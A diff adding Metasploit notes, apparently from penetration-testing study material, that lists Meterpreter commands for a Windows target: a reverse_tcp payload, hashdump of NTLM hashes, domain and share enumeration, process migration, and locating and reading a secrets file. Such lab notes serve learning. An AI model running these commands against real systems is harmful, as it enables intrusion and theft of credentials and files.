@@ -856,5 +856,16 @@ How to choose version:
 - ``` load python ```
 - ``` load kiwi ``` 
 
-**usage**
-- 
+**usage on a WINDOWS machine**
+- ``` set payload windows/meterpreter/reverse_tcp ```
+- ``` sysinfo ```
+- ``` hashdump ```
+- ``` post/windows/gather/enum_domain ```
+- ``` post/windows/gather/enum_shares ```
+- ``` post/windows/manage/migrate ```
+- NTLM hash, the second hash after command hashdump, what is the first.
+- ``` meterpreter > search -f secrets.txt ```
+- ``` meterpreter > cat "{file_path}" ```
+
+## What the Shell?
+
